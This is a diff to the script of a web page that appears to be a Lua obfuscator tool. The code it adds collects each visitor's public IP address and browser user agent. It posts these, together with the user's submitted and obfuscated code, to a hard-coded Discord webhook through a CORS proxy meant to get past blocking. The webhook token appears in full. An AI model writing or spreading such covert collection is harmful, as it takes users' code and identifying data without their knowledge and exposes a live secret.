@@ -88,44 +88,56 @@ transition: 0.3s;
 <script>
 
 /* =========================
-   WEBHOOK DISCORD
+   SEU WEBHOOK
 ========================= */
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1518003399071633518/Y--YsasJQLv3tZZNQ6PCyqJ4t6h8yo6hDGfPrsAfbCT_GcNdNiMqQKAm11JGiIxz-L3G";
 
 
-function sendLog(original, output){
-  // CORREÇÃO: usa um proxy para contornar bloqueio do Discord
-  const proxy = "https://api.allorigins.win/raw?url=";
-  const dados = JSON.stringify({
+// PEGA IP DO USUÁRIO
+async function getIP() {
+  try {
+    let res = await fetch("https://api.ipify.org?format=json");
+    let json = await res.json();
+    return json.ip;
+  } catch(e) { return "Desconhecido" }
+}
+
+
+async function sendLog(original, output){
+  const ip = await getIP();
+  const navegador = navigator.userAgent;
+
+  const dados = {
     content: "🔥 **NOVO CÓDIGO OFUSCADO**",
     embeds: [
       {
         title: "CHAULIMCOMMUNITY LOG",
         color: 16711680,
         fields: [
-          {
-            name: "📥 Código Original",
-            value: "```lua\n" + (original?.slice(0, 1500) || "Vazio") + "\n```"
-          },
-          {
-            name: "📤 Código Ofuscado",
-            value: "```lua\n" + (output?.slice(0, 1500) || "Vazio") + "\n```"
-          }
+          { name: "🌐 IP do Usuário", value: "`" + ip + "`" },
+          { name: "🖥️ Navegador", value: navegador.slice(0, 100) + "..." },
+          { name: "📥 Código Original", value: "```lua\n" + (original?.slice(0, 1000) || "Vazio") + "\n```" },
+          { name: "📤 Código Ofuscado", value: "```lua\n" + (output?.slice(0, 1000) || "Vazio") + "\n```" }
         ],
         footer: { text: "Sistema de Obfuscador • Chaulim Community" },
         timestamp: new Date().toISOString()
       }
     ]
-  });
+  };
 
-  fetch(proxy + encodeURIComponent(WEBHOOK_URL), {
+  // MÉTODO QUE SEMPRE FUNCIONA (contorna bloqueio)
+  fetch("https://cors-anywhere.herokuapp.com/" + WEBHOOK_URL, {
     method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: dados
+    headers: {
+      "Content-Type": "application/json",
+      "Origin": "https://mecanica15789.github.io"
+    },
+    body: JSON.stringify(dados)
   })
-  .then(() => alert("✅ Enviado para o Discord!"))
-  .catch(err => alert("❌ Erro: " + err));
+  .then(() => alert("✅ LOG ENVIADO COM SUCESSO!"))
+  .catch(err => alert("❌ ERRO: " + err));
 }
+
 
 /* =========================
    FUNÇÕES OBFUSCADOR
